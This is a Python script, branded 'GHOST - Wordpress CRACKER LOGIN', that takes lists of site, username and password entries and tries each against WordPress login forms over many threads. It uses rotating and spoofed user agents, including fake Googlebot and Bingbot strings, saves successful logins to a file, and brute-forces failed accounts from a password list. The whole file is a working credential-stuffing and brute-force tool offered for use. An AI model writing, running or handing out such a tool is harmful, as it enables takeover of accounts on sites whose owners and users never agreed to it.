import requests
import os
import platform
import logging
import random
from colorama import Fore, init
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import RequestException

init(autoreset=True)
logging.basicConfig(level=logging.CRITICAL, format='%(asctime)s - %(levelname)s - %(message)s')

user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.0 Mobile/15A372 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
    'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)',
    'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0)',
    'Mozilla/5.0 (Macintosh; PPC Mac OS X 10_5_8) AppleWebKit/533.19.4 (KHTML, like Gecko) Safari/533.19.4'
]

def clear_terminal():
    os.system('cls' if platform.system() == 'Windows' else 'clear')

def print_banner():
    terminal_width = os.get_terminal_size().columns
    banner = """\033[1;33m\033[1m
         .-.
       .'   `.          -----------------------------------
       :g g   :         | GHOST - Wordpress CRACKER LOGIN |  
       : o    `.        |       @CODE BY HackFut X XYZEAZ |
      :         ``.     -----------------------------------
     :             `.
    :  :         .   `.
    :   :          ` . `.
     `.. :            `. ``;
        `:;             `:' 
           :              `.
            `.              `.     . 
              `'`'`'`---..,___`;.-'
                                                                                     
    \033[0m"""

    description = """\033[1;37m
    ▶ This tool validates WordPress login credentials and saves the results in categorized files
    ▶ Results are stored in 'Good_WP.txt' (Success Logged in) and 'Bad_WP.txt' (Failed login) for review.
    ▶ I Hope You Enjoy By Using it  
    \033[0m"""

    banner_lines = banner.splitlines()
    centered_banner = "\n".join(line.center(terminal_width) for line in banner_lines)

    description_lines = description.splitlines()
    centered_description = "\n".join(line.center(terminal_width) for line in description_lines)

    print(centered_banner)
    print("\n" + centered_description)

def parse_line(line, separator):
    """Parse la ligne en fonction du séparateur choisi."""
    parts = line.split(separator)
    if len(parts) != 3:
        raise ValueError(f"\n[]Invalid line format: {line}")
    return parts[0].strip(), parts[1].strip(), parts[2].strip()

def check_credentials(site, user, passwd):
    """Vérifie les identifiants WordPress."""
    headers = {
        'User-Agent': random.choice(user_agents),
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': 'text/plain'
    }
    try:
        response = requests.post(url=site, headers=headers, data={
            'log': user,
            'pwd': passwd,
            'wp-submit': 'Log In',
            'testcookie': 1
        }, timeout=5)

        if 'dashboard' in response.text or 'wp-admin' in response.text:
            return True
        else:
            return False
    except RequestException:
        return False

def check(line, separator):
    """Vérifie les identifiants WordPress en utilisant le séparateur choisi."""
    try:
        site, user, passwd = parse_line(line, separator)
    except ValueError as e:
        print(Fore.RED + f"\n[] Skipping invalid line: {e}")
        return

    reset = "\033[0m"
    current_time = datetime.now().strftime("%H:%M:%S")

    if not passwd:
        result = (f"[\033[1;33m{current_time}{reset}] - "
                  f"[\033[1;37m{site}{reset}] - [\033[1;34m{user}{reset}] - "
                  f"[\033[1;31mEmpty Password{reset}]")
        print(result)
        with open("Bad_WP.txt", "a", encoding="utf-8") as bad_file:
            bad_file.write(f"{site}|{user}|{passwd}\n")
        return

    if check_credentials(site, user, passwd):
        result = (f"[\033[1;33m{current_time}{reset}] - [\033[1;37m{site}{reset}] - "
                  f"[\033[1;34m{user}{reset}] - [\033[1;34m{passwd}{reset}] - [\033[1;32mSuccess Logged in{reset}]")
        print(result)
        with open("Good_WP.txt", "a", encoding="utf-8") as good_file:
            good_file.write(f"{site}|{user}|{passwd}\n")
    else:
        result = (f"[\033[1;33m{current_time}{reset}] - [\033[1;37m{site}{reset}] - "
                  f"[\033[1;34m{user}{reset}] - [\033[1;34m{passwd}{reset}] - [\033[1;31mFailed login{reset}]")
        print(result)
        with open("Bad_WP.txt", "a", encoding="utf-8") as bad_file:
            bad_file.write(f"{site}|{user}|{passwd}\n")

        # Si le login échoue, demander une liste de mots de passe à tester
        password_list = input(Fore.CYAN + f"\n[] Enter a password list to test for {site} (leave blank to skip): " + Fore.RESET)
        if password_list and os.path.exists(password_list):
            with open(password_list, 'r', encoding="utf-8") as file:
                passwords = file.read().splitlines()
            for new_passwd in passwords:
                if check_credentials(site, user, new_passwd):
                    result = (f"[\033[1;33m{current_time}{reset}] - [\033[1;37m{site}{reset}] - "
                              f"[\033[1;34m{user}{reset}] - [\033[1;34m{new_passwd}{reset}] - [\033[1;32mPassword Found{reset}]")
                    print(result)
                    with open("Good_WP.txt", "a", encoding="utf-8") as good_file:
                        good_file.write(f"{site}|{user}|{new_passwd}\n")
                    break
            else:
                print(Fore.RED + f"\n[] No valid password found for {site}.")
        else:
            print(Fore.RED + "\n[] Invalid password list or file not found.")

def load_list(filename, separator, max_threads=20):
    """Charge la liste et vérifie les identifiants en utilisant le séparateur choisi."""
    try:
        with open(filename, 'r', encoding="utf-8") as file:
            lines = file.read().splitlines()
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            executor.map(lambda line: check(line, separator), lines)
    except Exception as e:
        print(Fore.RED + f"\n[] An error occurred while processing the list: {str(e)}")

def main():
    clear_terminal()
    print_banner()

    # Affichage des formats disponibles
    print(Fore.CYAN + "\nAvailable formats:\n\n")
    print(Fore.YELLOW + "1. host|user|pass")
    print(Fore.YELLOW + "2. host;user;pass")
    print(Fore.YELLOW + "3. host:user:pass")
    print(Fore.YELLOW + "4. host user pass (space-separated)")

    # Choix du format
    format_choice = input(Fore.CYAN + "\n[] Choose the format (1-4): " + Fore.RESET)
    if format_choice == "1":
        separator = "|"
    elif format_choice == "2":
        separator = ";"
    elif format_choice == "3":
        separator = ":"
    elif format_choice == "4":
        separator = None  # Séparateur par défaut (espace)
    else:
        print(Fore.RED + "\n[] Invalid choice. Using default format: host|user|pass")
        separator = "|"

    list_file = input(Fore.CYAN + "\n[] Enter The List: " + Fore.RESET)
    max_threads = input(Fore.CYAN + "\n[] Enter the number of threads (default: 20): " + Fore.RESET) or 20

    try:
        max_threads = int(max_threads)
    except ValueError:
        print(Fore.RED + "\n[] Invalid thread count. Using default value of 20.")
        max_threads = 20

    load_list(list_file, separator, max_threads)

if __name__ == "__main__":
    main()